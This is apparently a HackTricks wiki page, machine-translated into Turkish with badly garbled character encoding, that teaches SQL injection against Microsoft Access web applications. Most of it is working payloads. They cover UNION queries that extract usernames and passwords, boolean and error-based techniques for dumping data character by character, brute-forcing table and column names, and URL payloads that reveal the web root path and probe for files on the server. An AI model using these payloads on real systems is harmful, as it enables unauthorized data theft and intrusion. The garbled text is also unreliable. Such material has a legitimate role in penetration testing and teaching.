# MS Access SQL Injection

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Ã‡evrimiÃ§i Oyun AlanÄ±

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB SÄ±nÄ±rlamalarÄ±

### Dize BirleÅŸtirme

Dize birleÅŸtirme `& (%26)` ve `+ (%2b)` karakterleri ile mÃ¼mkÃ¼ndÃ¼r.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Yorumlar

MS Access'te yorum yoktur, ancak gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bir sorgunun sonunu NULL karakteri ile kaldÄ±rmak mÃ¼mkÃ¼ndÃ¼r:
```sql
1' union select 1,2 from table%00
```
EÄŸer bu Ã§alÄ±ÅŸmÄ±yorsa, sorgunun sÃ¶zdizimini her zaman dÃ¼zeltebilirsiniz:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Desteklenmiyorlar.

### LIMIT

**`LIMIT`** operatÃ¶rÃ¼ **uygulanmamÄ±ÅŸtÄ±r**. Ancak, SELECT sorgu sonuÃ§larÄ±nÄ± **ilk N tablo satÄ±rÄ± ile sÄ±nÄ±rlamak mÃ¼mkÃ¼ndÃ¼r, `TOP` operatÃ¶rÃ¼nÃ¼ kullanarak**. `TOP`, dÃ¶ndÃ¼rÃ¼lecek satÄ±r sayÄ±sÄ±nÄ± temsil eden bir tam sayÄ± argÃ¼manÄ± alÄ±r.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Just like TOP you can use **`LAST`** which will get the **satÄ±rlarÄ± sonundan**.

## UNION SorgularÄ±/Alt sorgular

Bir SQLi'de genellikle baÅŸka tablolardan bilgi Ã§Ä±karmak iÃ§in yeni bir sorgu Ã§alÄ±ÅŸtÄ±rmak istersiniz. MS Access her zaman **alt sorgularda veya ek sorgularda bir `FROM` belirtilmesini gerektirir**.\
Bu nedenle, bir `UNION SELECT` veya `UNION ALL SELECT` veya bir koÅŸul iÃ§inde parantez iÃ§indeki bir `SELECT` Ã§alÄ±ÅŸtÄ±rmak istiyorsanÄ±z, her zaman **geÃ§erli bir tablo adÄ± ile bir `FROM` belirtmeniz gerekir**.\
Bu nedenle, **geÃ§erli bir tablo adÄ±nÄ±** bilmeniz gerekir.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
Bu, tablo adÄ±nÄ± bilmeden mevcut tablonun deÄŸerlerini dÄ±ÅŸa aktarmanÄ±za olanak tanÄ±r.
{% endhint %}

**MS Access**, **`'1'=2='3'='asd'=false`** gibi **garip sÃ¶zdizimlerine** izin verir. Genellikle SQL enjeksiyonu bir **`WHERE`** ifadesinin iÃ§inde olacaktÄ±r, bunu kÃ¶tÃ¼ye kullanabiliriz.

Bir MS Access veritabanÄ±nda bir SQLi'ye sahip olduÄŸunuzu ve bir **sÃ¼tun adÄ±nÄ±n username** olduÄŸunu bildiÄŸinizi (veya tahmin ettiÄŸinizi) hayal edin ve dÄ±ÅŸa aktarmak istediÄŸiniz alan bu. Chaining equals tekniÄŸi kullanÄ±ldÄ±ÄŸÄ±nda web uygulamasÄ±nÄ±n farklÄ± yanÄ±tlarÄ±nÄ± kontrol edebilir ve **Mid** fonksiyonunu kullanarak alt dizeleri almak iÃ§in **boolean injection** ile iÃ§erik dÄ±ÅŸa aktarabilirsiniz.
```sql
'=(Mid(username,1,3)='adm')='
```
EÄŸer **tablonun adÄ±nÄ±** ve **dÃ¶kÃ¼lecek sÃ¼tunu** biliyorsanÄ±z, `Mid`, `LAST` ve `TOP` kombinasyonunu kullanarak **tÃ¼m bilgileri sÄ±zdÄ±rmak** iÃ§in boolean SQLi kullanabilirsiniz:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

Chaining equals tekniÄŸini kullanarak, **tablo adlarÄ±nÄ± brute-force** yapmak iÃ§in ÅŸunlarÄ± kullanabilirsiniz:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Daha geleneksel bir yol da kullanabilirsiniz:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap yaygÄ±n tablo adlarÄ±: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) adresinde baÅŸka bir liste var.

### SÃ¼tun adlarÄ±nÄ± Brute-Force ile Bulma

Mevcut sÃ¼tun adlarÄ±nÄ± **brute-force ile bulmak** iÃ§in eÅŸit zincirleme hilesini kullanabilirsiniz:
```sql
'=column_name='
```
Ya da **group by** ile:
```sql
-1' GROUP BY column_name%00
```
Ya da **farklÄ± bir tablonun** sÃ¼tun adlarÄ±nÄ± brute-force ile bulabilirsiniz:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

Zaten [**eÅŸit zincirleme tekniÄŸi**](ms-access-sql-injection.md#chaining-equals-+-substring) **ile mevcut ve diÄŸer tablolardan veri dÃ¶kme** konusunu tartÄ±ÅŸtÄ±k. Ancak baÅŸka yollar da var:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
KÄ±sacasÄ±, sorgu bir â€œif-thenâ€ ifadesi kullanarak baÅŸarÄ± durumunda â€œ200 OKâ€ veya aksi takdirde â€œ500 Internal Errorâ€ tetikler. TOP 10 operatÃ¶rÃ¼nden faydalanarak, ilk on sonucu seÃ§mek mÃ¼mkÃ¼ndÃ¼r. ArdÄ±ndan LAST kullanÄ±mÄ±, yalnÄ±zca 10. tuple'Ä± dikkate almayÄ± saÄŸlar. Bu deÄŸerde, MID operatÃ¶rÃ¼nÃ¼ kullanarak basit bir karakter karÅŸÄ±laÅŸtÄ±rmasÄ± yapmak mÃ¼mkÃ¼ndÃ¼r. MID ve TOP'un indeksini uygun ÅŸekilde deÄŸiÅŸtirerek, tÃ¼m satÄ±rlar iÃ§in â€œusernameâ€ alanÄ±nÄ±n iÃ§eriÄŸini dÃ¶kebiliriz.

### Zaman TabanlÄ±

[https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN) adresini kontrol edin.

### DiÄŸer Ä°lginÃ§ Fonksiyonlar

* `Mid('admin',1,1)` konum 1'den uzunluÄŸu 1 olan alt dize alÄ±r (baÅŸlangÄ±Ã§ konumu 1'dir)
* `LEN('1234')` dize uzunluÄŸunu alÄ±r
* `ASC('A')` karakterin ascii deÄŸerini alÄ±r
* `CHR(65)` ascii deÄŸerinden dize alÄ±r
* `IIF(1=1,'a','b')` eÄŸer o zaman
* `COUNT(*)` Ã¶ÄŸe sayÄ±sÄ±nÄ± sayar

## TablolarÄ± Sayma

[**buradan**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) tablo isimlerini almak iÃ§in bir sorgu gÃ¶rebilirsiniz:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Ancak, **`MSysObjects`** tablosunu okumak iÃ§in eriÅŸiminiz olmadÄ±ÄŸÄ±nda SQL EnjeksiyonlarÄ± bulmanÄ±n Ã§ok tipik olduÄŸunu unutmayÄ±n.

## Dosya Sistemi EriÅŸimi

### Web KÃ¶k Dizin Tam Yolu

**Web kÃ¶k mutlak yolunun bilgisi, daha fazla saldÄ±rÄ±yÄ± kolaylaÅŸtÄ±rabilir**. Uygulama hatalarÄ± tamamen gizlenmemiÅŸse, dizin yolu, var olmayan bir veritabanÄ±ndan veri seÃ§meye Ã§alÄ±ÅŸarak ortaya Ã§Ä±karÄ±labilir.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access, **web dizininin tam yolunu iÃ§eren bir hata mesajÄ±** ile yanÄ±t verir.

### Dosya SayÄ±mÄ±

AÅŸaÄŸÄ±daki saldÄ±rÄ± vektÃ¶rÃ¼, **uzaktaki dosya sisteminde bir dosyanÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karÄ±m yapmak iÃ§in** kullanÄ±labilir. Belirtilen dosya mevcutsa, MS Access, veritabanÄ± formatÄ±nÄ±n geÃ§ersiz olduÄŸunu bildiren bir hata mesajÄ± tetikler:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

DosyalarÄ± saymanÄ±n bir diÄŸer yolu, **bir veritabanÄ±.tablosu Ã¶ÄŸesini belirtmektir**. **EÄŸer** belirtilen **dosya mevcutsa**, MS Access, **veritabanÄ± format hatasÄ± mesajÄ±** gÃ¶sterir.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb Dosya AdÄ± Tahmini

**VeritabanÄ± dosya adÄ± (.mdb)** aÅŸaÄŸÄ±daki sorgu ile Ã§Ä±karÄ±labilir:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Burada **name\[i] bir .mdb dosya adÄ±dÄ±r** ve **realTable, veritabanÄ± iÃ§inde mevcut bir tablodur**. MS Access her zaman bir hata mesajÄ± tetikleyecek olsa da, geÃ§ersiz bir dosya adÄ± ile geÃ§erli bir .mdb dosya adÄ±nÄ± ayÄ±rt etmek mÃ¼mkÃ¼ndÃ¼r.

### .mdb Åifre KÄ±rÄ±cÄ±

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html), Microsoft Access 95/97/2000/XP veya Jet Database Engine 3.0/4.0 ana veritabanÄ± ÅŸifresini kurtarmak iÃ§in kullanÄ±labilecek Ã¼cretsiz bir araÃ§tÄ±r.

## Referanslar

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
